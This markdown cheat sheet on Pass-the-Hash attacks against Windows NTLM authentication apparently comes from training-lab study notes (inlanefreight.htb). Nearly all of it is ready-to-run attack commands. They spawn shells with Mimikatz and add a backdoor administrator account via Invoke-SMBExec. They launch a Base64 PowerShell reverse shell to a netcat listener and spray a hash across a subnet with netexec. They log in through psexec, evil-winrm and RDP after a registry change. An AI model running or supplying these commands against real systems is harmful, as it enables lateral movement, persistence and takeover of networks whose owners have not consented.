# Pass the Hash (PtH)

## Overview 

Pass the Hash abuses the NTLM authentication protocol, which uses a password hash rather than a plaintext password to authenticate. If an attacker can obtain an NTLM hash of a user they can authenticate as that user across the network without ever having to crack the password.

## Key Notes

- Only works with **NTLM hashes** (not NTLMv2 or Kerberos)
- Hash format used: `LM:NT` — if no LM hash, use `aad3b435b51404eeaad3b435b51404ee:` as placeholder


## Attack Methods 

### 1. Mimikatz — Spawn Process as Another User

Opens a new `cmd.exe` running in the context of the target user:

```bash
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

---

### 2. Invoke-TheHash (PowerShell)

> Tool: Invoke-TheHash — supports SMB and WMI execution

**Add user to local admins via SMB:**

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

**Reverse shell via WMI:**

1. Generate Base64 PowerShell reverse shell at [revshells.com](https://revshells.com) → _PowerShell #3 (Base64)_
2. Start listener: `nc -lvnp 4444`
3. Execute:

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e <base64_payload>"
```

---

### 3. Impacket — PSExec

```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

---

### 4. NetExec (NXC) — SMB

**Spray hash across subnet:**

```bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

**Execute command on target:**

```bash
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

---

### 5. Evil-WinRM

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

> For domain accounts include the domain: `-u administrator@inlanefreight.htb`

---

### 6. RDP (xfreerdp)

> Requires **Restricted Admin Mode** enabled on the target — disabled by default.

**Enable Restricted Admin Mode on target:**

```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

**Connect:**

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

---

## Attack Chain Summary

```
Obtain NTLM hash (Mimikatz, secretsdump, SAM dump, etc.)
  → Choose execution method based on available services:
      SMB open       → impacket-psexec / NXC / Invoke-SMBExec
      WinRM open     → evil-winrm
      WMI available  → Invoke-WMIExec (reverse shell)
      RDP open       → xfreerdp /pth (enable Restricted Admin first)
      Local access   → Mimikatz sekurlsa::pth 
```

